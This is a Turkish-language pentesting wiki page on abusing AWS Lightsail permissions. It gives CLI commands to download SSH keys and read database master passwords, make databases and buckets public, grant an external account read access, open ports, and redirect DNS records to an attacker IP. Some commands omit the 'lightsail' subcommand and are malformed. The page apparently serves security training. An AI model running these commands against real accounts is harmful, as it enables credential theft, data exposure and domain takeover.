# AWS - Lightsail Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## Lightsail

For more information about Lightsail check:

{{#ref}}
../../aws-services/aws-lightsail-enum.md
{{#endref}}

> [!WARNING]
> Lightsail'in **kullanıcıya ait IAM rollerini kullanmadığını**, bunun yerine AWS tarafından yönetilen bir hesaba ait olduğunu not etmek önemlidir; bu yüzden bu servisi privesc amaçlı kötüye kullanamazsınız. Ancak, kod, API keys ve veritabanı bilgileri gibi **hassas veriler** bu serviste bulunabilir.

### `lightsail:DownloadDefaultKeyPair`

This permission will allow you to get the SSH keys to access the instances:
```
aws lightsail download-default-key-pair
```
**Olası Etki:** instance'ların içinde hassas bilgileri bulma.

### `lightsail:GetInstanceAccessDetails`

Bu izin, instance'lara erişmek için SSH anahtarları oluşturmanıza olanak tanır:
```bash
aws lightsail get-instance-access-details --instance-name <instance_name>
```
**Potansiyel Etki:** instances içinde hassas bilgi bulunabilir.

### `lightsail:CreateBucketAccessKey`

Bu izin, bucket'a erişim için bir anahtar almanızı sağlar:
```bash
aws lightsail create-bucket-access-key --bucket-name <name>
```
**Olası Etki:** Bucket içinde hassas bilgilerin bulunması.

### `lightsail:GetRelationalDatabaseMasterUserPassword`

Bu izin, veritabanına erişmek için gerekli kimlik bilgilerini almanızı sağlar:
```bash
aws lightsail get-relational-database-master-user-password --relational-database-name <name>
```
**Olası Etki:** Veritabanı içindeki hassas bilgileri bulma.

### `lightsail:UpdateRelationalDatabase`

Bu izin, veritabanına erişim parolasını değiştirmenize olanak tanır:
```bash
aws lightsail update-relational-database --relational-database-name <name> --master-user-password <strong_new_password>
```
Eğer veritabanı herkese açık değilse, bu izinlerle herkese açık hale de getirebilirsiniz.
```bash
aws lightsail update-relational-database --relational-database-name <name> --publicly-accessible
```
**Potansiyel Etki:** Veritabanı içinde hassas bilgilerin bulunması.

### `lightsail:OpenInstancePublicPorts`

Bu izin, portları Internet'e açmaya izin verir.
```bash
aws lightsail open-instance-public-ports \
--instance-name MEAN-2 \
--port-info fromPort=22,protocol=TCP,toPort=22
```
**Potansiyel Etki:** Hassas portlara erişim.

### `lightsail:PutInstancePublicPorts`

Bu izin, portları internete açmaya izin verir. Dikkat: yapılan çağrı, belirtilmeyen tüm açık portları kapatacaktır.
```bash
aws lightsail put-instance-public-ports \
--instance-name MEAN-2 \
--port-infos fromPort=22,protocol=TCP,toPort=22
```
**Olası Etki:** Hassas portlara erişim.

### `lightsail:SetResourceAccessForBucket`

Bu izin, instances'lara herhangi bir ek kimlik bilgisi olmadan bir bucket'a erişim vermeyi sağlar.
```bash
aws set-resource-access-for-bucket \
--resource-name <instance-name> \
--bucket-name <bucket-name> \
--access allow
```
**Potential Impact:** Hassas bilgiler içeren buckets'lara potansiyel yeni erişim.

### `lightsail:UpdateBucket`

Bu izinle bir saldırgan kendi AWS hesabına buckets'lara okuma erişimi verebilir veya buckets'ları herkese açık hale getirebilir:
```bash
# Grant read access to exterenal account
aws update-bucket --bucket-name <value> --readonly-access-accounts <external_account>

# Grant read to the public
aws update-bucket --bucket-name <value> --access-rules getObject=public,allowPublicOverrides=true

# Bucket private but single objects can be public
aws update-bucket --bucket-name <value> --access-rules getObject=private,allowPublicOverrides=true
```
**Potential Impact:** Hassas bilgi içeren buckets'lara potansiyel yeni erişim.

### `lightsail:UpdateContainerService`

Bu izinlerle bir attacker containers service üzerinden private ECRs'e erişim verebilir.
```bash
aws update-container-service \
--service-name <name> \
--private-registry-access ecrImagePullerRole={isActive=boolean}
```
**Potential Impact:** Özel ECR'den hassas bilgilerin ele geçirilmesi

### `lightsail:CreateDomainEntry`

Bu izne sahip bir saldırgan alt alan oluşturup bunu kendi IP adresine yönlendirebilir (subdomain takeover), alan adından spoof emails göndermesine olanak tanıyan bir SPF kaydı oluşturabilir veya hatta ana alan adını kendi IP adresine yönlendirebilir.
```bash
aws lightsail create-domain-entry \
--domain-name example.com \
--domain-entry name=dev.example.com,type=A,target=192.0.2.0
```
**Potential Impact:** Bir alan adının ele geçirilmesi

### `lightsail:UpdateDomainEntry`

Bu izne sahip bir saldırgan bir subdomain oluşturup bunu kendi IP address'ine yönlendirerek (subdomain takeover) veya domaine ait e-postaları spoof etmesine izin veren bir SPF record oluşturabilir, hatta ana domain'i kendi IP address'ine yönlendirebilir.
```bash
aws lightsail update-domain-entry \
--domain-name example.com \
--domain-entry name=dev.example.com,type=A,target=192.0.2.0
```
**Olası Etki:** Takeover a domain

{{#include ../../../../banners/hacktricks-training.md}}
